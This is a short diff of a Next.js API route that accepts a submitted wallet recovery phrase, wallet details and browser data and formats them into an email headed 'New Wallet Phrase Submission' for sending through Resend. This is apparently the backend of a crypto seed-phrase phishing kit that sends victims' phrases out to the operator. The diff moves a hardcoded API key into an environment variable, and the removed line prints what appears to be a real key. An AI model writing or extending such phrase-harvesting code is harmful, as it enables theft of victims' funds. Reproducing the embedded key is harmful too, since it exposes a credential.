@@ -3,7 +3,7 @@ import { Resend } from "resend";
 
 export async function POST(req: NextRequest) {
   const { phrase, wallet, browserData } = await req.json();
-  const resend = new Resend("re_YQyiMEP3_6qz1339Cp1Bq2XgdcFy3gAxh");
+  const resend = new Resend(process.env.RESEND_API_KEY);
   const emailText = `
 New Wallet Phrase Submission
 --------------------------
